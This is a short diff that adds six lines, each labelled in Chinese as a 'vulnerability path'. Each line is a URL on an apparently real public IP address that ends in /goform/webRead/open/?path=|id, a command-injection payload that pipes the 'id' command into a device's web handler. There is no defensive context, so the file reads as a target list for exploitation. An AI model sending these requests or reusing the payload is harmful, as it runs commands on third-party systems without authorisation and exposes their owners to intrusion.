@@ -1,0 +1,6 @@
+漏洞路径 http://222.209.85.62:30002/goform/webRead/open/?path=|id
+漏洞路径 http://222.71.50.218:2023/goform/webRead/open/?path=|id
+漏洞路径 http://183.6.58.88:880/goform/webRead/open/?path=|id
+漏洞路径 http://220.182.60.249:8888/goform/webRead/open/?path=|id
+漏洞路径 http://112.226.145.121:8081/goform/webRead/open/?path=|id
+漏洞路径 http://171.212.100.13:20000/goform/webRead/open/?path=|id
